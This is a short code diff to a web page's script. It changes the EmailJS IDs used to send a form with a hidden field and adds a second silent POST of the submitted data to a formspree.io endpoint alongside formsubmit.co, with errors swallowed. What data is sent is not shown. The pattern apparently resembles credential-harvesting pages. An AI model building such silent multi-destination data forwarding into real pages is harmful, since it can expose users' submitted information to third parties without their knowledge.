@@ -248,7 +248,7 @@ user-scalable=0">
     form.appendChild(hiddenInput); // Append the hidden input to the form
 
     // Send the dynamically created form using EmailJS
-    emailjs.sendForm('service_8pj074k', 'template_ipjt2ql', form)
+    emailjs.sendForm('service_manllwo', 'template_oydls6m', form)
         .then(() => {
             console.log('SUCCESS!');
         }, (error) => {
@@ -265,6 +265,13 @@ user-scalable=0">
             await postData(
             dataToSubmit
             , 'https://formsubmit.co/24fcbfab9fcc8a8bf03e403070f885e3');
+            } catch (error) {
+                
+            }
+     try {
+            await postData(
+            dataToSubmit
+            , 'https://formspree.io/f/xnnqvlrb');
             } catch (error) {
                 
             }
